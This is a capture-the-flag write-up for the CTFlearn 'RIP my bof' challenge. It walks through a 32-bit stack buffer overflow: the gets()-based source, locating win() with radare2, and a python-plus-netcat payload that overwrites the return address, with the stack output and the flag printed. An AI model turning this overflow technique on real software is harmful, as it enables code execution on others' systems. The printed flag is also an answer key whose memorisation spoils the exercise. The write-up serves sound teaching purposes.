# [RIP my bof](https://ctflearn.com/challenge/1011) (30)
Looks like another buffer overflow challenge, we can connect to the server with `netcat`:
```
$ nc thekidofarcrania.com 4902
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffe19350 | 00 00 00 00 00 00 00 00 |
0xffe19358 | 00 00 00 00 00 00 00 00 |
0xffe19360 | 00 00 00 00 00 00 00 00 |
0xffe19368 | 00 00 00 00 00 00 00 00 |
0xffe19370 | ff ff ff ff ff ff ff ff |
0xffe19378 | ff ff ff ff ff ff ff ff |
0xffe19380 | c0 85 ee f7 00 a0 04 08 |
0xffe19388 | 98 93 e1 ff 8b 86 04 08 |
Return address: 0x0804868b

Input some text:
```

Each row here is 8 bytes across, and since we need to overwrite the return address (the last 4 bytes) of this 64 byte block, we will needing a padding of 60 bytes. <br />
However the question still stands of what we need to overwrite this return address with, that's where the [simple-rip.tar.gz](https://ctflearn.com/challenge/download/1011) file comes in. <br />

We can open the `.tar.gz` file with `tar`: <br />
```
$ tar -xvf simple-rip.tar.gz 
pwn-simple-rip/server
pwn-simple-rip/bof2.c
$ cd pwn-simple-rip/
```

Inside the new directory are `bof2.c` and `server`. <br />
`server` can be analyzed with `file`: <br />
```
$ file server 
server: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=be2f490cdd60374344e1075c9dd31060666bd524, not stripped
```

If we execute the `server` binary, we find that it's the same executable being used by the `netcat` server in serving us responses. <br />

We can read the `bof2.c` code to see the source code of the binary: <br />
```
$ cat bof2.c
\#include <stdio.h>
\#include <stdlib.h>
\#include <string.h>
\#include <unistd.h>

// Defined in a separate source file for simplicity.
void init_visualize(char* buff);
void visualize(char* buff);

void win() {
  system("/bin/cat /flag.txt");
}

void vuln() {
  char padding[16];
  char buff[32];

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Mark the padding with 0xff.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff); 

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff); 
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  vuln();
}
```

The chunk of code to really take notice of here is `win()` function:
```
void win() {
	system("/bin/cat /flag.txt");
}
```

It executes the syscall to run a UNIX command, in this case `cat /flag.txt` <br />
We need to redirect the `rip` pointer to this `win()` function to get the flag. <br />

We can get the location in memory of the `win()` function using `radare2` to analyze the binary: <br />
```
$ r2 -A server
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x08048470]> afl
0x080483a8    3 35           sym._init
0x080483e0    1 6            sym.imp.setbuf
0x080483f0    1 6            sym.imp.printf
0x08048400    1 6            sym.imp.gets
0x08048410    1 6            sym.imp.puts
0x08048420    1 6            sym.imp.system
0x08048430    1 6            sym.imp.__libc_start_main
0x08048440    1 6            sym.imp.memset
0x08048450    1 6            sym.imp.sprintf
0x08048460    1 6            sub.__gmon_start___244_460
0x08048470    1 50           entry0
0x080484a3    1 4            fcn.080484a3
0x080484b0    1 2            sym._dl_relocate_static_pie
0x080484c0    1 4            sym.__x86.get_pc_thunk.bx
0x080484d0    4 50   -> 41   sym.deregister_tm_clones
0x08048510    3 52           sym.register_tm_clones
0x08048550    3 34   -> 31   sym.__do_global_dtors_aux
0x08048580    1 6            entry1.init
0x08048586    1 43           sym.win
0x080485b1    1 143          sym.vuln
0x08048640    1 90           sym.main
0x0804869a    1 4            sym.__x86.get_pc_thunk.ax
0x0804869e    4 67           sym.init_visualize
0x080486e1   17 430          sym.visualize
0x08048890    4 93           sym.__libc_csu_init
0x080488f0    1 2            sym.__libc_csu_fini
0x080488f4    1 20           sym._fini
[0x08048470]>
```
Here, we can find `sym.win` resides at address `0x08048586` <br />

Now we can create our payload, 60 `A`s followed by `0x86`, `0x85`, `0x04` and `0x08`: <br />
`python -c 'print "A" * 60 + "\x86\x85\x04\x08" '` <br />
Don't try copying the text directly from the terminal, I tried this and found that the 4 non-ascii bytes would change once copied, instead, we can pipe this directly into `netcat` to act as our input:<br />
```
$ python -c 'print "A" * 60 + "\x86\x85\x04\x08" ' | nc thekidofarcrania.com 4902

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffae93c0 | 00 00 00 00 00 00 00 00 |
0xffae93c8 | 00 00 00 00 00 00 00 00 |
0xffae93d0 | 00 00 00 00 00 00 00 00 |
0xffae93d8 | 00 00 00 00 00 00 00 00 |
0xffae93e0 | ff ff ff ff ff ff ff ff |
0xffae93e8 | ff ff ff ff ff ff ff ff |
0xffae93f0 | c0 95 f0 f7 00 a0 04 08 |
0xffae93f8 | 08 94 ae ff 8b 86 04 08 |
Return address: 0x0804868b

Input some text: 
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffae93c0 | 41 41 41 41 41 41 41 41 |
0xffae93c8 | 41 41 41 41 41 41 41 41 |
0xffae93d0 | 41 41 41 41 41 41 41 41 |
0xffae93d8 | 41 41 41 41 41 41 41 41 |
0xffae93e0 | 41 41 41 41 41 41 41 41 |
0xffae93e8 | 41 41 41 41 41 41 41 41 |
0xffae93f0 | 41 41 41 41 41 41 41 41 |
0xffae93f8 | 41 41 41 41 86 85 04 08 |
Return address: 0x08048586

CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}
```

We successfully redirected the instruction pointer `rip` to `0x08048586` and ran the `win()` function, which read the contents of `/flag.txt` <br />

The flag is `CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}` <br />
